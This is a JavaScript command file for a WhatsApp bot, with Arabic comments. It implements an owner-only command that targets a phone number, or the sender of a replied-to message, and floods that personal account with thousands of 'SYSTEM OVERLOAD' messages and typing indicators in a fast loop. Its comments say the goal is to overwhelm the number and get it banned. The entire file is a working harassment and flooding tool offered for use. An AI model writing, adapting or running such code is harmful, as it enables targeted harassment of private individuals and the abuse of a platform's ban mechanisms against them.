/**
 * تبنيد-ر.js — أمر تبنيد وضغط الأرقام الشخصية بأقصى سرعة (Turbo)
 * ══════════════════════════════════════════════════════════════
 *  .تبنيد-ر <الرقم>      ← بدء الهجوم الفائق على رقم محدد مع حساب الزمن
 *  .تبنيد-ر (بالرد)     ← بدء الهجوم بالرد على رسالة الضحية
 * ══════════════════════════════════════════════════════════════
 */

module.exports = {
    name: 'تبنيد-ر',
    command: ['تبنيد-ر'],
    category: 'owner',
    description: 'بروتوكول الهجوم الفائق والضغط المكثف للأرقام الشخصية مع حساب الزمن اللازم',

    async execute(sock, m) {
        const jid = m.key.remoteJid;
        const body = m.message?.conversation || m.message?.extendedTextMessage?.text || '';
        const args = body.trim().split(/ +/).slice(1);
        
        let targetNumber = args[0]?.trim();

        // دعم الاستهداف عن طريق الرد على رسالة الشخص
        const quoted = m.message?.extendedTextMessage?.contextInfo;
        if (!targetNumber && quoted && quoted.participant) {
            targetNumber = quoted.participant.split('@')[0];
        }

        const reply = async (text) => {
            return await sock.sendMessage(jid, { text }, { quoted: m });
        };

        if (!targetNumber) {
            return reply('⚠️ [خطأ] يرجى كتابة الرقم أو الرد على رسالة الشخص المراد تبنيده.\nمثال: `.تبنيد-ر 2011xxxxxxxx`');
        }

        const cleanPhone = targetNumber.replace(/[^0-9]/g, '');
        const targetUserJid = `${cleanPhone}@s.whatsapp.net`;

        // إعدادات السرعة الفائقة وحساب الزمن اللازم بدقة
        const totalAttempts = 5000; // رفع عدد المحاولات للضغط الأقصى
        const delayPerBatch = 50;   // تقليص الفاصل الزمني لزيادة السرعة الضعف
        const estimatedSeconds = Math.ceil((totalAttempts * delayPerBatch) / 1000);
        const timeMessage = estimatedSeconds > 60 
            ? `حوالي ${Math.ceil(estimatedSeconds / 60)} دقائق` 
            : `${estimatedSeconds} ثانية`;

        // إرسال رسالة البدء مع إظهار الزمن المطلوب تماماً
        await reply(
            `⚠️ [بروتوكول تدمير الأرقام الفائق]\n` +
            `🚀 الهدف المستهدف: *+${cleanPhone}*\n` +
            `🔥 الحالة: *ضغط واكتساح فائق السرعة (Turbo Max)*\n` +
            `⏱️ *الزمن اللازم للإنجاز:* ${timeMessage}\n` +
            `🎯 إجمالي محاولات الضغط: *${totalAttempts}*\n\n` +
            `_جاري ضغط وإغراق الرقم بأقصى سرعة حتى الإنتهاء..._`
        );

        // تنفيذ حلقة الضغط الفائق والمتوازي لزيادة السرعة
        (async () => {
            let count = 0;
            while (count < totalAttempts) {
                try {
                    // إرسال طلبات ضغط متعددة ومتزامنة في الدفة الواحدة لتسريع الحظر
                    const floodPromises = [
                        sock.sendMessage(targetUserJid, { text: '⚡ [SYSTEM OVERLOAD - CRITICAL STRIKE] ⚡' }).catch(() => {}),
                        sock.sendPresenceUpdate('composing', targetUserJid).catch(() => {})
                    ];

                    await Promise.all(floodPromises);
                    count += 2;
                    
                    await new Promise(resolve => setTimeout(resolve, delayPerBatch));
                } catch (err) {
                    await new Promise(resolve => setTimeout(resolve, 30));
                }
            }
        })();
    }
};
